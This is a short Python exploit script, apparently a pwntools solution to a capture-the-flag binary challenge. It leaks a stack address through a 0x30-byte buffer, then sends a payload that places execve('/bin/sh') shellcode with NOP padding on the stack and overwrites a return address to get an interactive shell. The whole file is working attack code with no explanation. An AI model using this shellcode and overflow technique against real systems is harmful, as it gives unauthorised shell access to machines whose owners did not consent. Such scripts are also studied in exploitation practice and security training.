from parse_args_and_some_func import *

sh = all_parsed_args['io']

shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
sh.sendafter("who are u?\n", "a" * 0x30)
sh.recvuntil("a" * 0x30)
stack_addr = sh.recvn(6)
stack_addr = u64(stack_addr + b'\x00\x00')
LOG_ADDR("stack_addr", stack_addr)

sh.sendlineafter("give me your id ~~?\n", '0')

payload =p64(stack_addr -0xc0 + 8) + shellcode + (0x30 - len(shellcode)) * b"\x90" + p64(stack_addr + 8)
sh.sendafter("give me money~\n", payload)
sleep(2)
sh.sendline('3')

sh.interactive()
